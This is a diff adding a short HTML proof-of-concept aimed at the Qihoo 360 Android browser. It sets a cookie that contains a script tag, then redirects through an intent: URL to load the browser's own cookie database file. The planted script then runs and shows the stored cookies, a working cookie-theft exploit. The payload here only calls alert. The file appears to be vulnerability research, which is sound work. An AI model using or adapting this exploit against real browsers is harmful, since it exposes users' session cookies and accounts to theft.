@@ -1,0 +1,13 @@
+<html>
+<title>test 360 browser</title>
+<body>
+load...
+<script>
+document.cookie = "OK=<script>alert(document.body.innerHTML)</scr"+"ipt>";
+
+setTimeout(function() {
+location.href = "intent:file:///data/data/com.qihoo.browser/databases/webviewCookiesChromium.db#Intent;SEL;package=com.qihoo.browser;component=com.qihoo.browser/com.qihoo360.reader.lightbrowser.BrowserActivityLight;end";
+}, 500);
+</script>
+</body>
+</html>
